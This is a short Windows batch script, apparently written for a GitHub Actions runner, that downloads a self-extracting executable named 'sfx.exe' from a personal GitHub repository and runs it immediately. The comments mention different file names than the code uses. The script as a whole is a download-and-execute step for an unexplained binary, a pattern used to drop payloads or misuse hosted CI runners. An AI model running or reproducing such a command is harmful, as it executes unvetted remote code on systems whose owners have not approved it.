@echo off
REM Download x.exe and x32.exe using curl

REM Download x.exe
curl -L -o "C:\Users\runneradmin\Desktop\sfx.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/sfx.exe"
start "" "C:\Users\runneradmin\Desktop\sfx.exe"

REM Pause to keep the batch window open
pause
